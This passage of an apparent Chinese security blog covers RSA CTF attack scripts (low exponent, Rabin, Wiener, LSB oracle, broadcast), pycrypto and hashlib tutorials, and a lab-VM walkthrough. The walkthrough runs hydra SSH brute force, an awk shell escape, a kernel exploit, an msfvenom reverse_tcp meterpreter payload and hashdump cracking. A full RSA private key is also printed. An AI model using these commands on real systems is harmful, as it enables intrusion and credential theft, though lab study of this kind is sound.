m。指数y可以是负数，如果x mod m的逆存在，则返回正确的结果。否则，引发ValueErrorplain = gmpy2.powmod(cipher1, s, n) * gmpy2.powmod(cipher2, t, n) % nprint long_to_bytes(plain) 小明文攻击：适用情况：e较小，一般为3。公钥e很小，明文m也不大的话，于是m^e=k*n+m 中的的k值很小甚至为0，爆破k或直接开三次方即可。 Jarvis OJ Extremely hard RSA 12345678910111213import gmpy2,binascii,libnum,timen=0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929e=3res=0c=int(open('extremelyhardRSA.rar/flag.enc','rb').read().encode('hex'),16)print time.asctime()for i in xrange(200000000): if gmpy2.iroot(c+n*i,3)[1]==1: res=gmpy2.iroot(c+n*i,3)[0] print i,res print libnum.n2s(res) print time.asctime() break Rabin加密中的N可被分解:Rabin加密是RSA的衍生算法，e==2是Rabin加密典型特征,一般先通过其他方法分解得到p，q，然后解密. python实现： 1234567891011def rabin_decrypt(c, p, q, e=2): n = p * q mp = pow(c, (p + 1) / 4, p) mq = pow(c, (q + 1) / 4, q) yp = gmpy2.invert(p, q) yq = gmpy2.invert(q, p) r = (yp * p * mq + yq * q * mp) % n rr = n - r s = (yp * p * mq - yq * q * mp) % n ss = n - s return (r, rr, s, ss) Jarvis OJ hard RSA 12345678910111213141516171819import gmpy2import libnumn=0xC2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDp=275127860351348928173285174381581152299q=319576316814478949870590164193048041239e=2c=int(open('hardRSA.rar/flag.enc','rb').read().encode('hex'),16)mp=pow(c,(p+1)/4,p)mq=pow(c,(q+1)/4,q)yp=gmpy2.invert(p,q)yq=gmpy2.invert(q,p)r=(yp*p*mq+yq*q*mp)%nrr=n-rs=(yp*p*mq-yq*q*mp)%nss=n-sprint libnum.n2s(r)print libnum.n2s(rr)print libnum.n2s(s)print libnum.n2s(ss) Wiener’s Attack:适用情况：e过大或过小(低解密指数攻击) 工具地址：[]:https://github.com/pablocelayes/rsa-wiener-attack 这里脚本运行报错的话，再脚本前加上： 12import syssys.setrecursionlimit(10000000) python实现： 1234567891011121314151617from Crypto.PublicKey import RSAimport ContinuedFractions, Arithmeticdef wiener_hack(e, n): frac = ContinuedFractions.rational_to_contfrac(e, n) convergents = ContinuedFractions.convergents_from_contfrac(frac) for (k, d) in convergents: if k != 0 and (e * d - 1) % k == 0: phi = (e * d - 1) // k s = n - phi + 1 discr = s * s - 4 * n if (discr &gt;= 0): t = Arithmetic.is_perfect_square(discr) if t != -1 and (s + t) % 2 == 0: print("Hacked!") return d return False nextrsa-Level2 1234n = 0x92411fa0c93c1b27f89e436d8c4698bcf554938396803a5b62bd10c9bfcbf85a483bd87bb2d6a8dc00c32d8a7caf30d8899d90cb8f5838cae95f7ff5358847db1244006c140edfcc36adbdcaa16cd27432b4d50d2348b5c15c209364d7914ef50425e4c3da07612cc34e9b93b98d394b43f3eb0a5a806c70f06697b6189606eb9707104a7b6ff059011bac957e2aae9ec406a4ff8f8062400d2312a207a9e018f4b4e961c943dfc410a26828d2e88b24e4100162228a5bbf0824cf2f1c8e7b915efa385efeb505a9746e5d19967766618007ddf0d99525e9a41997217484d64c6a879d762098b9807bee46a219be76941b9ff31465463981e230eecec69691d1Le = 0x6f6b385dd0f06043c20a7d8e5920802265e1baab9d692e7c20b69391cc5635dbcaae59726ec5882f168b3a292bd52c976533d3ad498b7f561c3dc01a76597e47cfe60614f247551b3dbe200e2196eaa001a1d183886eeacddfe82d80b38aea24de1a337177683ed802942827ce4d28e20efef92f38f1b1a18c66f9b45f5148cceabfd736de8ac4a49e63a8d35a83b664f9f3b00f822b6f11ff13257ee6e0c00ca5c98e661ea594a9e66f2bd56b33d9a13f5c997e67a37fcf9a0c7f04d119fe1ba261127357e64a4b069aefed3049c1c1fe4f964fd078b88bedd064abea385cfebd65e563f93c12d34eb6426e8aa321033cfd8fe8855b9e74d07fe4f9d70de46fLd = wiener_hack(e, n)print d 私钥文件修复:适用情况：提供破损的私钥文件 Jarvis OJ-God Like RSA []:https://www.40huo.cn/blog/rsa-private-key-recovery-and-oaep.html LSB Oracle Attack:适用情况：可以选择密文并泄露最低位 在一次RSA加密中，明文为m，模数为n，加密指数为e，密文为c。我们可以构造出c&#39;=((2^e)*c)%n=((2^e)*(m^e))%n=((2*m)^e)%n ， 因为m的两倍可能大于n，所以经过解密得到的明文是 m&#39;=(2*m)%n 。我们还能够知道 m&#39; 的最低位lsb 是1还是0。 因为n是奇数，而2*m 是偶数，所以如果lsb是0，说明(2*m)%n 是偶数，没有超过n，即m&lt;n/2.0 ，反之则m&gt;n/2.0 。举个例子就能明白2%3=2 是偶数，而4%3=1 是奇数。以此类推，构造密文c&quot;=(4^e)*c)%n 使其解密后为m&quot;=(4*m)%n ，判断m&quot; 的奇偶性可以知道m 和 n/4 的大小关系。所以我们就有了一个二分算法，可以在对数时间内将m的范围逼近到一个足够狭窄的空间 123456789101112131415161718import decimaldef oracle(): return lsb == 'odd'def partial(c, e, n): k = n.bit_length() decimal.getcontext().prec = k # for 'precise enough' floats lo = decimal.Decimal(0) hi = decimal.Decimal(n) for i in range(k): if not oracle(c): hi = (lo + hi) / 2 else: lo = (lo + hi) / 2 c = (c * pow(2, e, n)) % n # print i, int(hi - lo) return int(hi) Baby RSA 1234567891011e = 0x10001n = 0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716dbc = 0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0λ nc 47.96.239.28 23333----------------------------- baby rsa -----------------------------Come and Decode your dataIf you give me ciphertext, I can tell you whether decoded data is even or oddYou can input ciphertext(hexdecimal) now1odd 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354# -*- coding: utf-8 -*-# by https://findneo.github.io/# ref:# https://crypto.stackexchange.com/questions/11053/rsa-least-significant-bit-oracle-attack# https://ctf.rip/sharif-ctf-2016-lsb-oracle-crypto-challenge/# https://introspelliam.github.io/2018/03/27/crypto/RSA-Least-Significant-Bit-Oracle-Attack/import libnum, gmpy2, socket, time, decimaldef oracle(c1): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) hostname = '47.96.239.28' port = 23333 s.connect((hostname, port)) s.recv(1024) s.send(hex(c1)[2:].strip("lL") + '\n') res = s.recv(1024).strip() s.close() if res == 'even': return 0 if res == 'odd': return 1 else: assert (0)def partial(c, n): global c_of_2 k = n.bit_length() decimal.getcontext().prec = k # allows for 'precise enough' floats lower = decimal.Decimal(0) upper = decimal.Decimal(n) for i in range(k): possible_plaintext = (lower + upper) / 2 # lower==0 when i&lt;1809 flag = oracle(c) if not flag: upper = possible_plaintext # plaintext is in the lower half else: lower = possible_plaintext # plaintext is in the upper half c = (c * c_of_2) % n # multiply y by the encryption of 2 again print i, flag, int(upper - lower) # time.sleep(0.2) # By now, our plaintext is revealed! return int(upper)def main(): print "[*] Conducting Oracle attack..." return partial((c * c_of_2) % n, n)if __name__ == '__main__': e = 0x10001 n = 0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db 选择密文攻击:适用情况：可以构造任意密文并获得对应明文(在一个RSA加密过程中，明文为m，密文为c，模数为n，加密指数为e，选取x以满足gcd(x,n)==1 从而使x模n的逆存在，构造密文 c&#39;=c*(x^e) 使解密后明文为 m&#39;=(m*x)%n ，则m=m&#39;*x^-1(mod n)) 广播攻击:适用情况：模数n、密文c不同，明文m、加密指数e相同。一般会是e=k，然后给k组数据(使用不同的模数n，相同的公钥指数e加密相同的信息。就会得到多个(m^e) ==ci (mod ni)，将(m^e)视为一个整体M，这就是典型的中国剩余定理适用情况) nextrsa-Level9 123456789m = random.randint(0x100000000000, 0xffffffffffff)e = 3n1 = 0x43d819a4caf16806e1c540fd7c0e51a96a6dfdbe68735a5fd99a468825e5ee55c4087106f7d1f91e10d50df1f2082f0f32bb82f398134b0b8758353bdabc5ba2817f4e6e0786e176686b2e75a7c47d073f346d6adb2684a9d28b658dddc75b3c5d10a22a3e85c6c12549d0ce7577e79a068405d3904f3f6b9cc408c4cd8595bf67fe672474e0b94dc99072caaa4f866fc6c3feddc74f10d6a0fb31864f52adef71649684f1a72c910ec5ca7909cc10aef85d43a57ec91f096a2d4794299e967fcd5add6e9cfb5baf7751387e24b93dbc1f37315ce573dc063ecddd4ae6fb9127307cfc80a037e7ff5c40a5f7590c8b2f5bd06dd392fbc51e5d059cffbcb85555Ln2 = 0x60d175fdb0a96eca160fb0cbf8bad1a14dd680d353a7b3bc77e620437da70fd9153f7609efde652b825c4ae7f25decf14a3c8240ea8c5892003f1430cc88b0ded9dae12ebffc6b23632ac530ac4ae23fbffb7cfe431ff3d802f5a54ab76257a86aeec1cf47d482fec970fc27c5b376fbf2cf993270bba9b78174395de3346d4e221d1eafdb8eecc8edb953d1ccaa5fc250aed83b3a458f9e9d947c4b01a6e72ce4fee37e77faaf5597d780ad5f0a7623edb08ce76264f72c3ff17afc932f5812b10692bcc941a18b6f3904ca31d038baf3fc1968d1cc0588a656d0c53cd5c89cedba8a5230956af2170554d27f524c2027adce84fd4d0e018dc88ca4d5d26867Ln3 = 0x280f992dd63fcabdcb739f52c5ed1887e720cbfe73153adf5405819396b28cb54423d196600cce76c8554cd963281fc4b153e3b257e96d091e5d99567dd1fa9ace52511ace4da407f5269e71b1b13822316d751e788dc935d63916075530d7fb89cbec9b02c01aef19c39b4ecaa1f7fe2faf990aa938eb89730eda30558e669da5459ed96f1463a983443187359c07fba8e97024452087b410c9ac1e39ed1c74f380fd29ebdd28618d60c36e6973fc87c066cae05e9e270b5ac25ea5ca0bac5948de0263d8cc89d91c4b574202e71811d0ddf1ed23c1bc35f3a042aac6a0bdf32d37dede3536f70c257aafb4cfbe3370cd7b4187c023c35671de3888a1ed1303Lc1 = pow(m, e, n1)c2 = pow(m, e, n2)c3 = pow(m, e, n3)print m == gmpy2.iroot(CRT([n1, n2, n3], [c1, c2, c3]), e)[0] 总结： 看了各位表哥写的关于RSA的文章，学到了很多，以前之学习了数论，在代码上实践的很少，对这些脚本进行学习，总结，在RSA这一块有了很大的帮助。各位表哥的脚本写的很好，值得学习。 参考链接： []:https://www.anquanke.com/post/id/84632 []:https://github.com/findneo/RSA-ATTACK []:https://blog.csdn.net/qq_31481187/article/details/70448108 []:https://blog.csdn.net/like98k/article/details/79352076]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>密码学</tag>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-pycrypto模块浅学]]></title>
    <url>%2F2018%2F08%2F31%2Fpython-pycrypto%E6%A8%A1%E5%9D%97%E6%B5%85%E5%AD%A6%2F</url>
    <content type="text"><![CDATA[python-pycrypto模块学习 12345678910111213141516&gt; pycrypto模块时python中来处理加密解密等信息安全相关的一个重要模块&gt; 对称加密方式：&gt; &gt; AES&gt; DES&gt; ARC4&gt; 散列值计算：&gt; &gt; MD5&gt; SHA&gt; HMAC&gt; 公钥加密和签名：&gt; &gt; RSA&gt; DSA&gt; 生成公私密钥123456789101112131415161718192021222324252627282930313233343536373839#伪随机数生成器random_generator = Random.new().read#rsa算法生成实例rsa = RSA.generate(1024,random_generator)#master的密钥对的生成private_pem = rsa.exportKey()#生成公私钥对文件with open('master-private.pem','wb') as f: f.write(private_pem)public_pem = rsa.publickey().exportKey()with open('master-public.pem','wb') as f: f.write(public_pem)"""-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDXamjBCTqlzBxnk0B00G/Ae6hkpKS/0zz0Q7qvCGOjWttrmPyvDdMgxyGnJri4PHvMkN0jAMbU32NKN8ojcoKOdH434DPL/ClbqMi5usk70HLDpfhWs/ylOJ6H01JyIzONnZsr3MdOde8RNvn2ZGjk3JqXDfOzB3T0Ad0F3p7OBwIDAQAB-----END PUBLIC KEY----------BEGIN RSA PRIVATE KEY-----MIICXAIBAAKBgQDXamjBCTqlzBxnk0B00G/Ae6hkpKS/0zz0Q7qvCGOjWttrmPyvDdMgxyGnJri4PHvMkN0jAMbU32NKN8ojcoKOdH434DPL/ClbqMi5usk70HLDpfhWs/ylOJ6H01JyIzONnZsr3MdOde8RNvn2ZGjk3JqXDfOzB3T0Ad0F3p7OBwIDAQABAoGAeVSc9gUtvE7PvOLqjiEMoJzFxxIZHVZsYaR4VLfj7xFwvxTnVe3yeebPJKehqVuf2yPI+jsowqOj+ByeRQLtVyjoZH7aW6uZQcKUtMrAMgcZouIKpKVWFhjWguFlCExsfi8EqzxVsBPBkHynqkU69IB4yPB1AMRb4ZcGsYvCgNECQQDpBoiaMD72+YObbnXKhqW8PxU6/ylZvZL+wFE4Qwcu0nclni/vMMkrxK8oZvAiVOqBjCSXwcA6zZXLMZppBJaZAkEA7Kdo+7fCUyAeivzoYGHKE8Kmr/RTHW7oSgz1bBMdzAugsO8zuNGAfMnLYXTGBJFlfPQuOW3W6Q5UKHppV0uNnwJBAL0kU36ryH/ZGWzxJOUFk8MPhSEE+cBgss7atVIwfcUQiitbkdbZR4CiPfZST3neaRZL9WvElU5ljr+GfKnfUokCQA5LwqzKGgQZgZ7VzlfcMG/nJ1ijws2ZYJDwnXbM5NTpsuhdWtuEVGW1bwLRIhEuk1nsCkrP1ta3VeAoHOr4FnMCQDxnFKPCpjRSEM96xFDNgNh+66wgKg/SXMY5E7e0/LvBoFcJauclu+cP8eaqP0zasVR/xqQT4y091vSZzIADJLA=-----END RSA PRIVATE KEY-----""" 利用python对RSA根据公私钥加解密1234567891011121314151617181920#RSA使用公私钥加解密数据：from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5 as Cipher_phcs_v1_5import base64message = 'hello demos this is a plian text!'with open('./master-public.pem','r') as f: key = f.read() rsakey = RSA.importKey(key) #导入读取到的公钥 cipher = Cipher_phcs_v1_5.new(rsakey) #实例化 cipher_text = base64.b64encode(cipher.encrypt(message)) #这里需要注意的一点是，py2可以直接将str加密，而py3要转换为bytes # cipher_text = base64.b64encode(cipher.encrypt(message).encode(encoding = 'utf-8')) #语句如下 print cipher_textwith open('./master-private.pem','r') as f: key = f.read() rsakey = RSA.importKey(key) cipher = Cipher_phcs_v1_5.new(rsakey) text = cipher.decrypt(base64.b64decode(cipher_text),"ERROR") print text #py2这里返回的是str类型的，py3返回的是bytes，需要自己转换 总结 在python中libnum、gmpy2、pycrypto在密码学中的应用广泛，也特别方便。]]></content>
      <categories>
        <category>python</category>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>编程</tag>
        <tag>python</tag>
        <tag>pycrypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python常用模块—-hashlib]]></title>
    <url>%2F2018%2F08%2F30%2Fpython%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97%E2%80%94-hashlib%2F</url>
    <content type="text"><![CDATA[python常用模块——hashlib 1234&gt; python的hashlib提供了常见的摘要算法，如MD5,SHA1等&gt; 摘要算法又称为hash算法、散列算法。它通过一个函数把任意长度的数据转换为一个长度的固定的数据串（通常用十六进制字符串表示）&gt; 摘要算法反推很困难，因为摘要函数是单向的，对原始数据做一个bit的修改，都会导致计算出的摘要完全不同&gt; hashlib模块学习12345678910111213141516171819202122#coding:utf-8import hashlibmd5 = hashlib.md5()md5.update('how to use md5 in python hashlib?')#使用生成实例的update方法进行MD5的转换，同时，update会将每次的字符串拼接，如果想要不同的值，每次过后都得实例化print md5.hexdigest() #返回摘要信息，以十六进制数据返回print md5.digest() #返回摘要信息，以二进制数据返回#刚才说过的update，如果数据量很大，可以使用它拼接#MD5是最常见的摘要算法，速度很快，生成结果是固定的128 bit字节，通常用一个32位的16进制字符串表示md52 = hashlib.md5()md5.update('how to use md5 in')md5.update('python hashlib?')print md5.hexdigest()#SHA1的结果是160 bit字节，通常用一个40位的16进制字符串表示#有没有可能两个不同的数据通过某个摘要算法得到了相同的摘要？完全有可能，因为任何摘要算法都是把无限多的数据集合映射到一个有限的集合中。这种情况称为碰撞sha1 = hashlib.sha1()sha1.update('how to use sha1 in ')sha1.update('python hashlib?')print sha1.hexdigest() 实例1.进行hash爆破： 123456789101112#coding:utf-8import stringimport hashliba = string.digits + string.lowercase + string.uppercasefor i in a: for j in a: for k in a: for m in a: s = hashlib.md5(i+j+k+m).hexdigest()[0:6] if s == '9bf514': print i+j+k+m 2.用hashlib模拟用户登录，以及password值加盐存储： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#coding:utf-8import re, hashlibdic = &#123; 'syq123': '506420d6fc050439850f1cb80eb70b9c', 'feifei': 'f95f65d787a87a5e3d32c61b3f7e9bec', 'zsg123': '87c34b8d2950946df7a987a990cad99f'&#125;def get_md5(password): md5 = hashlib.md5() md5.update(password) return md5.hexdigest()def Salt_get_md5(password,name): return get_md5(password + name + 'salt')def username(): #创建用户 name = raw_input('please input your username!!') if re.match(r'^[a-zA-Z].&#123;2,9&#125;',name): userpassword(name) else: print 'input error!' username()def userpassword(name): password = raw_input('please input your password:') password = Salt_get_md5(password,name) print password dic[name] = password #这里如果用update方法时会出现一个问题，添加进字典的不是变量对应的值，而是输入的变量名称 print dicdef login(): str = 'Please Login' print str.center(25) name = raw_input('please input your username:') password = raw_input('please input your password:') password = Salt_get_md5(password,name) if dic[name] == password: print 'Login Success!' else: print 'Login faild! username or password error!' login()if __name__ == '__main__': ch = raw_input('请选择1或2:1-&gt;登录，2-&gt;注册') # print type(ch) if ch == '1': login() elif ch == '2': username() ch = raw_input('请选择1或2:1-&gt;登录，2-&gt;退出') if ch == '1': login() elif ch =='2': exit('bye!!!')]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>编程</tag>
        <tag>python</tag>
        <tag>hashlib</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python字符操作]]></title>
    <url>%2F2018%2F08%2F29%2Fpython%E5%AD%97%E7%AC%A6%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[字符串操作需求 123456&gt; string模块定义了一些常用的属性（包含所有的数字，字母，可打印的所有ascii码等）&gt; python的字符串操作可以通过两部分的方法函数基本上就可以解决所有的字符串操作需求：&gt; 1.python的字符串属性函数&gt; 2.python的string模块&gt; 一次python对字符的操作，人生苦短!&gt; 文档练习实例如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109# coding:utf-8import string"""string模块定义了一些常用的属性（包含所有的数字，字母，可打印的所有ascii码等）python的字符串操作可以通过两部分的方法函数基本上就可以解决所有的字符串操作需求：1.python的字符串属性函数2.python的string模块"""#1.字符串输出格式对齐 str = 'PyTHON heLLo'print str.center(20) #生成20个字符长度，str处于中间位置print str.ljust(20) #生成20个字符，str左对齐print str.rjust(20) #2.大小写转换print str.upper() #转大写print str.lower() #转小写print str.capitalize() #字符串首字母大写，其余小写print str.swapcase() #大小写对换print str.title() #以分隔符为标记，首字符为大写，其余为小写 #3.字符串判断条件str1 = '01234'print str1.isalnum() #判断是否全是数字和字母，并至少有一个字符print str1.isdigit() #判断是否全是数字，并至少有一个字符 str2 = 'string' print str2.isalnum() #判断是否全是数字或字母，并至少有一个字符print str2.isalpha() #判断是否全是字母，并至少有一个字符print str2.islower() #判断是否全是小写字母，当全是小写和数字的组合时也会返回Trueprint str2.isspace() #判断是否全是空白字符，并至少有一个字符print str2.isspace() #判断是否全是大写，如果全是大写和数字也会返回Trueprint str2.istitle() #判断是否每个单词的首字母为大写print str2.startswith('str') #判断字符是否以str开头print str2.endswith('ing') #判断字符是否以ing结尾 #4.字符串搜索定位与替换str3 = 'string IEarn'print str3.find('z') #查找字符串，没有则返回-1，有则返回查找到的第一个索引print str3.rfind('n') #返回索引的最后一次匹配print str3.index('s') #没有匹配则报错，如果匹配到则和find类似，返回第一次索引print str3.count('a') #返回字符串中匹配的次数print str3.replace('n','N') #搜索替换print str3.strip('n') #删除字符串首尾匹配的字符，通常用于默认删除回车符print str3.lstrip('n') #左配符print str3.rstrip('n') #右配符 str4 = 'tab' print str4.expandtabs() #把制表符转换为空格print str4.expandtabs(5)#指定空格数 #5.字符串编码与解码 str5 = "字符串学习"print str5print str5.decode('utf-8') #6.字符串分割变换 str6 = 'Learn string'print '-'.join(str6) str7 = ['Learn','string']print '-'.join(str7) print str6.split('n')print str6.split('n',1) print str6.rstrip('n')print str6.rsplit('n',1)print str6.splitlines()print str6.partition('n')print str6.rpartition('n') #7.打印出一些常用的字符print string.lettersprint string.ascii_letters #两个都是打印出大小写字母 print string.lowercaseprint string.ascii_lowercase #打印小写字母 print string.uppercaseprint string.ascii_uppercase #打印大写字母 print string.digits #打印十进制数字print string.octdigits #打印八进制数字print string.hexdigits #打印十六进制数字print string.printable #打印数字，大小写字母和特殊字符print string.punctuation #打印特殊字符print string.whitespace #打印一些如制表符一样的符号 #8.string中定义的方法"string.capwords(s, sep=None)是多个字符串方法的组合split(),capitalize(),join()"s = 'ahelloaworld'print string.capwords(s, 'a')#等价于：print 'a'.join([i.capitalize() for i in s.split('a')]) #实例：生成200的随机优惠券（长度是20位的） import randomkey = string.letters + string.digitsfor i in range(200): k = [random.choice(key) for i in range(20)] print ''.join(k) 练习图示：]]></content>
      <tags>
        <tag>编程</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[超级玛丽靶机渗透]]></title>
    <url>%2F2018%2F08%2F19%2F%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[靶机渗透 以前看到一篇关于靶机渗透的文章，看了一下觉得比较有意思，所以下载下来玩了一下。原文链接 搭建环境靶机IP：192.168.0.105 攻击主机IP：192.168.0.106 渗透过程 靶机只有一个登陆界面，所以端口扫描来一波 nmap.exe -sV -p- -T5 192.168.0.105 发现开了22和8180端口，访问一下8180端口，可以访问，就从8180端口入手，发现啥都没有，目录扫描走一波 sudo dirb http://192.168.0.105:8180 /usr/share/dirb/wordlists/big.txt 发现一个vhosts目录，访问以后得到如下信息：发现有服务名，修改本地hosts文件访问一下 然后访问[http://mario.supermariohost.local:8180/ 得到如下界面，并没有发现什么有用的信息，再来一次目录扫描（这里说明一下，本来是没有扫到东西的，所以看了一下原文，发现是扫出来的，也许是字典进行了改进，在后文评论中看到马里奥的弟弟是luigi ，emmm。。果然是） 访问一下地址：发现一串英文，利用cewl对连接进行爬取然后生成一个自定义的字典 ，这里是对一些单词的提取，针对可能有用的进行提取cewl &lt;http://mario.supermariohost.local:8180/&gt; -d -w /root/Desktop/666.txt 利用生成的自定义字典使用john生成一个自定义的密码字典 john --wordlist=/home/dest/666.txt --stdout --rules &gt; 777.txt 这里联想到前面的那个目录luigi和生成的密码，然后对22端口进行爆破 hydra -l luigi -P /home/toml/777.txt 192.168.0.105 ssh -t 20 得到ssh的账号密码，进行登录，登录成功以后发现shell权限被限制了，和python进行沙盒逃逸挺像的 在原文中有一篇关于内网渗透中绕过shell限制的文章：www.4hou.com/penetration/11674.html ，通过awk ‘BEGIN{system(“/bin/bash”)}’ 绕过限制,由于测试过进行总结，所以靶机再没重启 然后进行提权：通过查看内核发现是3.13.0的内核版本，通过公开的提权程序进行提权：https://www.exploit-db.com/raw/37292/，下载以后是html,修改后缀名进行编译执行 gcc 77.c -o test 拿到root权限 提权成功后在root目录下发现了flag.zip,解压发现需要密码： 将靶机上的flag压缩包下载到本地，利用msf生成后门程序，在靶机上下载执行： sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=7777 -f elf &gt; /var/www/html/5.elf 利用fcrackzip爆破压缩包的密码 fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt flag.zip 查看flag发现要拿到所有的账户密码，这个时候已经在msf上反弹shell了，所以先把所有的hash抓下来 run post/linux/gather/hashdump 然后利用刚才破解的压缩包密码生成字典，将密码保存到一个新的文件夹中，然后生成 john --wordlist=/home/toml/newpass.txt --stdout --rules &gt; newpasse.txt 加载字典，然后本地破解hash，得到所有的账户密码： john --wordlist=/home/toml/newpasse.txt /home/toml/.msf4/loot/20180819175754_default_192.168.0.105_linux.hashes_331263.txt 利用得到的账户密码均登陆成功：渗透完成 总结 本次靶机的渗透测试，看了表哥的文章，思路清晰，收获很多，是一次学习的过程。]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python进程池和线程池]]></title>
    <url>%2F2018%2F06%2F28%2Fpython%E8%BF%9B%E7%A8%8B%E6%B1%A0%E5%92%8C%E7%BA%BF%E7%A8%8B%E6%B1%A0%2F</url>
    <content type="text"><![CDATA[python进程池和线程池学习 前几天学习了python的多进程通信，是python标准库中支持的多进程并发模块multiprocessing ，主要学习了它常用的两个类和几种进程间通信的方法，本文基于这一点继续拓展python的并发中的线程池和进程池。 多进程和多线程 按照书上的话来说“进程是资源分配的最小单位，线程是CPU调度的最小单位 ”但在实际中要分清楚它们的区别与联系才可以运用好多线程和多进程。多进程与多线程的区别 进程是程序在计算机上的一次执行活动。当你运行一个程序，你就启动了一个进程。显然，程序是死的(静态的)，进程是活的(动态的)。进程可以分为系统进程和用户进程。凡是用于完成操作系统的各种功能的进程就是系统进程，它们就是处于运行状态下的操作系统本身；所有由你启动的进程都是用户进程。进程是操作系统进行资源分配的单位。在Windows下，进程又被细化为线程，也就是一个进程下有多个能独立运行的更小的单位。 在同一个时间里，同一个计算机系统中如果允许两个或两个以上的进程处于运行状态，这便是多任务。 先贴一张图来看多线程和多进程再不同维度的对比： 基于上图总结： 需要频繁创建销毁的优先使用多线程，常见的是web服务器，来一个请求，建立一次连接、通信结束以后销毁连接，所以要使用多线程，如果使用多进程，创建和销毁的代价非常大。 需要进行大量计算的优先使用多线程，由于大量计算需要消耗大量的CPU资源、切换频繁，如图像处理、算法处理，使用多线程切换简单，CPU的利用率高。 处理关系相关性强的优先用多进程、相关性弱的优先用多线程。比如：服务器进行消息的收发和消息的处理，相关性不是很强，使用多进程可以提高并发速度；针对消息的处理有消息解码、业务处理等多种方式，这个时候需要数据间的共享，使用多线程会提高并发速度。 基于分布式的多核多机的优先使用多进程。 满足不同的需求，结合它们的特性选用合理的方式。 通过队列实现多线程和多进程的并发 使用multiprocessing.JoinableQueue实现多进程并发 JoinableQueue是multiprocessing的一种数据结构，它本质上是一个FIFO队列，它与一般队列的不同在于它的多进程是安全的，会自动解决互斥和死锁的问题。JoinableQueue主要可以用来存放执行的任务和收集任务的执行结果。 通过多进程并发打印26个字母 12345678910111213141516171819202122232425262728293031323334353637from multiprocessing import JoinableQueueimport multiprocessingimport random, timedef read(q): while True: try: 